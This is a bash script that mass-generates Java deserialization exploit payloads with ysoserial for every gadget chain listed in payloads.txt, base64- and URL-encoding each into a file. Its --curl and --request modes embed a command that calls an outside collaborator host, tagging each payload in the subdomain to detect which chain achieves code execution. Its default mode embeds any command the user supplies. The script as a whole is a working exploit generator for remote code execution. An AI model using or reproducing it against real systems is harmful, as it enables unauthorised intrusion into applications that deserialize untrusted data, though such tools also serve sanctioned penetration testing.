#!/bin/bash
command="$@"
if [ -z "$command" ]; then
    echo "./generate_payloads.sh <commands>"
    echo "./generate_payloads.sh --curl 'collaborator-link' #Adds payload name as a subdomain, so you can check which payload worked."
    echo "./generate_payloads.sh --request 'curl' 'collaborator-link' #Same as --curl, but you can choose the command to use. E.g. use ping instead of curl."
    exit
fi
if [ -f "serialized_payloads" ]; then
    echo "Do you want to delete the old payloads? [n/y]"
    read -r ans
    if [[ "$ans" == "y" || "$ans" == "Y" ]]; then
        rm serialized_payloads
        echo "deleted"
    fi
fi
payload_file="$(pwd)/payloads.txt"

while read -r payload; do
  if [ "$1" == "--curl" ]; then
    output="$(java11 -jar ysoserial-all.jar $payload "curl $payload.$2" | base64 -w 0)"
    #echo "java11 -jar ysoserial-all.jar $payload "curl $payload.$2" | base64 -w 0"
  elif [ "$1" == "--request" ]; then
    output="$(java11 -jar ysoserial-all.jar $payload "$2 $payload.$3" | base64 -w 0)"
  else
    output="$(java11 -jar ysoserial-all.jar $payload "$command" | base64 -w 0)"
  fi
  if [ -n "$output" ]; then
  	echo $(php -r "echo urlencode('$output');") >> serialized_payloads
  fi
  output=""
done <$payload_file
